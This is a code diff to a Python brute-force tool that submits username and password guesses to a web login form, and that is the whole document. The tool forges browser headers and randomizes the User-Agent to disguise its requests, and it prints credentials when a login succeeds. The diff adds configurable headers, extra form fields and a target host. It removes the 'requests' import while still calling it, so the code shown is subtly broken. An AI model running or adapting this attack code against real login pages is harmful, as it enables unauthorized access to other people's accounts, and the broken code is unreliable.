@@ -1,6 +1,5 @@
 import sys
 import time
-import requests
 from scipy import rand
 
 
@@ -22,6 +21,9 @@ def brute(parameters, passwords):
                'user_param': parameters['user_param'],
                'password_param': parameters['password_param'],
                'action' : parameters['action'],
+               'headers': parameters['req_header'],
+               'static_elements': parameters['static_elements'],
+               'host': parameters['host']
                }
 
     # if userlist is provided then checks if passwordlist is provided or just 1 password
@@ -59,32 +61,33 @@ def brute(parameters, passwords):
 
 def attack(content):
     '''
-   creat a packet containing fake headers and the payload(username,password) and submit it to the server
+   create a packet containing fake headers and the payload(username,password) and submit it to the server
     '''
 
     url = content['url']
 
     # build packet headers in order to disguise as a browser
-    headers = {'User-Agent': get_random_user_agent().encode().decode('utf-8'),
-               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-               'Accept-Language': 'en-gb,en;q=0.5',
-               'Accept-Encoding': 'gzip,deflate',
-               'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-               'Keep-Alive': '115',
-               'Connection': 'keep-alive',
-               'Cache-Control': 'max-age=0',
-               'Referer': url}
+    headers = content['headers']
+    headers['User-Agent'] = get_random_user_agent()
+    print()
+    print()
+    print(headers['User-Agent'])
+    print()
+    print()
+    
     payload = {
         content['user_param']: content['username'],
         content['password_param']: content['password']
     }
+    payload.update(content['static_elements'])
+
     if content['method'] == 'post':
-        resp = requests.post(url,data=payload, headers=headers)
+        resp = requests.post(content['host'], data=payload, headers=headers)
     else:
         resp = requests.get(url,data=payload,headers=headers)
 
     print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
-
+    # print(resp.text)
     if check_login(resp, content['password_param']):
         print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
         global success
